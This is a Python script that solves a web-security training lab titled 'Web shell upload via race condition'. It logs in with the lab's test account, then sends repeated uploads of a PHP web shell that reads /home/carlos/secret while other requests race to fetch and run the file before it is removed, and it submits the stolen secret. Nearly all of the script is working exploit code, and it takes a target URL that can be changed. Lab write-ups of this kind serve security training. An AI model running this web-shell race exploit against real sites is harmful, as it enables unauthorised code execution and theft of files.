#############################################################################
#
# Lab: Web shell upload via race condition
#
# Hack Steps: 
#      1. Fetch login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Extract the new csrf token from wiener profile
#      5. Upload the the shell file via race condition
#      6. Try to fetch the shell file concurrently from a different thread
#      7. Submit the solution
#
#############################################################################
import requests
import re
from colorama import Fore
import threading

# Change this to your lab URL
LAB_URL = "https://0a5a007e033bb14b82a9e241006500e0.web-security-academy.net"

SECRET_IS_FOUND = False

def main():
    global SECRET_IS_FOUND
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
  
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the new csrf token from wiener profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch("/my-account", cookies)
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]

    print(Fore.GREEN + "OK")

    shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
    shell_file_name = "hack.php" # You can change this to what you want
    files = { "avatar": (shell_file_name, shell_file, "application/x-php") }
    data = { "user": "wiener", "csrf": csrf_token }

    # this thread is used to send multiple upload requests concurrently with the fetch requests in the main thread
    new_thread = threading.Thread(target=upload_requests, args=(data, cookies, files))
    new_thread.start()

    # send the fetch request multiple times
    # 10 times is enough
    for counter in range(1,11):
        uploaded_shell = fetch(f"/files/avatars/{shell_file_name}", cookies)
        
        print(Fore.WHITE + f"⦗6⦘ Fetching the uploaded shell file to read the secret ({counter}/10).. " + Fore.GREEN + "OK")
    
        if uploaded_shell.status_code == 200:
            secret = uploaded_shell.text
            SECRET_IS_FOUND = True
            break
        else:
            continue

    print(Fore.BLUE + "❯❯ Secret: " + Fore.YELLOW + secret)

    data = { "answer": secret }
    post_data("/submitSolution", data)

    print(Fore.WHITE + "⦗7⦘ Submitting the solution.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, files = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, files=files, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")


def upload_requests(data, cookies, files):
    # send the upload request multiple times
    # 10 times is enough
    for counter in range(1,11):
        if SECRET_IS_FOUND:
            break
        else:
            post_data("/my-account/avatar", data, cookies, files)
            
            print(Fore.WHITE + f"⦗5⦘ Uploading the shell file via race condition ({counter}/10).. " + Fore.GREEN + "OK")

           
if __name__ == "__main__":
    main()

